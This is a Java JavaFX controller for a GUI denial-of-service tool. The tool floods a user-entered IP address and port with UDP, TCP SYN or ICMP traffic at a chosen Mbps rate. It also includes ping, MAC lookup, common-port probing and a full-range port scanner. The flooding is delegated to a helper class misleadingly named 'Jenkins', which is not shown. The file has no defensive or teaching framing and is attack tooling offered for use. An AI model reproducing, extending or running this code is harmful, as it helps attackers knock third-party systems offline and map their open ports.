package com.yourpackage;

import javafx.fxml.FXML;
import javafx.scene.control.TextField;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.ComboBox;
import javafx.collections.FXCollections;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import javafx.scene.control.TextArea;
import javafx.application.Platform;
import java.net.InetSocketAddress;
import java.io.IOException;
import javafx.scene.control.ToggleButton;
import javafx.scene.layout.HBox;

public class MainController {
    private Jenkins jenkinsTool;

    @FXML private TextField ipAddressField;
    @FXML private TextField portField;
    @FXML private TextField mbpsField;
    @FXML private TextField macAddressField;
    @FXML private ComboBox<String> attackTypeComboBox;
    @FXML private Button startButton;
    @FXML private Button stopButton;
    @FXML private Button pingButton;
    @FXML private Button getMacButton;
    @FXML private Label statusLabel;
    @FXML private TextArea logArea;
    @FXML private Button findOpenPortButton;

    @FXML private HBox rateBox;
    private boolean isMbps = true;

    @FXML
    public void initialize() {
        jenkinsTool = new Jenkins();
        jenkinsTool.setLogArea(logArea);
        
        attackTypeComboBox.setItems(FXCollections.observableArrayList("UDP Flood", "TCP SYN Flood", "ICMP Flood"));
        
        startButton.setOnAction(e -> startAttack());
        stopButton.setOnAction(e -> stopAttack());
        
        getMacButton.setOnAction(e -> getMacAddress());
    }

    @FXML
    public void pingTargetIP() {
        try {
            String ip = ipAddressField.getText();
            InetAddress address = InetAddress.getByName(ip);
            log("Pinging " + ip + "...");
            boolean reachable = address.isReachable(5000);
            String result = reachable ? "Ping successful" : "Ping failed";
            log(result);
            statusLabel.setText(result);
        } catch (Exception e) {
            log("Error: " + e.getMessage());
            statusLabel.setText("Error: " + e.getMessage());
        }
    }

    @FXML
    private void getMacAddress() {
        String targetIp = ipAddressField.getText();
        if (targetIp.isEmpty()) {
            log("Please enter a target IP address.");
            return;
        }
        String macAddress = jenkinsTool.getMacAddress(targetIp);
        if (macAddress != null) {
            macAddressField.setText(macAddress);
        } else {
            macAddressField.setText("MAC address not found");
        }
    }

    public void startAttack() {
        jenkinsTool.resetAttack();  // Add this line
        String attackType = attackTypeComboBox.getValue();
        String targetIp = ipAddressField.getText();
        int rate = Integer.parseInt(mbpsField.getText());
        int bytesPerSecond = rate * 125000; // Convert Mbps to bytes per second

        log("Starting attack with type: " + attackType + ", targetIp: " + targetIp + 
            ", rate: " + rate + " Mbps" + 
            ", bytesPerSecond: " + bytesPerSecond);

        statusLabel.setText("Status: Attack in Progress");
        statusLabel.setStyle("-fx-text-fill: #2e7d32;");

        if ("UDP Flood".equals(attackType)) {
            log("Starting UDP flood attack...");
            int targetPort = Integer.parseInt(portField.getText());
            new Thread(() -> {
                log("UDP flood thread started");
                jenkinsTool.udpFlood(targetIp, targetPort, bytesPerSecond);
                log("UDP flood thread ended");
            }).start();
        } else if ("TCP SYN Flood".equals(attackType)) {
            log("Starting TCP SYN flood attack...");
            int targetPort = Integer.parseInt(portField.getText());
            new Thread(() -> {
                log("TCP SYN flood thread started");
                boolean isElevated = jenkinsTool.tcpSynFlood(targetIp, targetPort, bytesPerSecond);
                if (!isElevated) {
                    log("Warning: Running in non-elevated mode. Attack may be less effective.");
                    log("For full effectiveness, run the application as administrator.");
                }
                log("TCP SYN flood thread ended");
            }).start();
        } else if ("ICMP Flood".equals(attackType)) {
            log("Starting ICMP flood attack...");
            new Thread(() -> {
                log("ICMP flood thread started");
                jenkinsTool.icmpFlood(targetIp, bytesPerSecond);
                log("ICMP flood thread ended");
            }).start();
        }
    }

    public void stopAttack() {
        jenkinsTool.stopAttack();
        statusLabel.setText("Status: Attack Stopped");
        statusLabel.setStyle("-fx-text-fill: #c62828;");
        log("Attack stopped");
    }

    @FXML
    public void findOpenPort() {
        String ip = ipAddressField.getText();
        log("Searching for open ports on " + ip);
        int[] commonPorts = {80, 443, 22, 21, 25, 3306, 8080, 1433, 3389, 5432};
        for (int port : commonPorts) {
            try (Socket socket = new Socket()) {
                socket.connect(new InetSocketAddress(ip, port), 100);
                portField.setText(String.valueOf(port));
                String message = "Open port found: " + port;
                log(message);
                statusLabel.setText(message);
                return;
            } catch (IOException e) {
                // Port is not open, continue to next
            }
        }
        String message = "No open ports found";
        log(message);
        statusLabel.setText(message);
    }

    private void log(String message) {
        String timestamp = java.time.LocalDateTime.now().format(java.time.format.DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
        Platform.runLater(() -> {
            logArea.appendText(timestamp + " - " + message + "\n");
            logArea.setScrollTop(Double.MAX_VALUE);
        });
    }

    public void scanPorts(String targetIp) {
        log("Starting port scan on " + targetIp);
        for (int port = 1; port <= 65535; port++) {
            try (Socket socket = new Socket()) {
                socket.connect(new InetSocketAddress(targetIp, port), 100);
                String message = "Port " + port + " is open";
                log(message);
                statusLabel.setText(message);
            } catch (IOException e) {
                // Port is not open, continue to next
            }
        }
        String message = "Port scan completed";
        log(message);
        statusLabel.setText(message);
    }

}